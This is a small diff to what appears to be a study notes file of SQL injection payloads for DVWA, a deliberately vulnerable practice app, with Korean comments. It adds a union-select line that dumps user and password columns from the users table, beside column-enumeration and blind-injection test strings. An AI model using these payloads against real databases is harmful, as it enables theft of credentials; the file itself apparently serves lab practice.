@@ -16,6 +16,9 @@
 // users 테이블 칼럼 조회
 1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'# 
 
+// users 테이블에서 user, password 컬럼의 data 를 조회
+1' union select user, password from users#
+
 // 블라인드 SQL 인젝션 참 구문
 1' AND 1=1# 
 
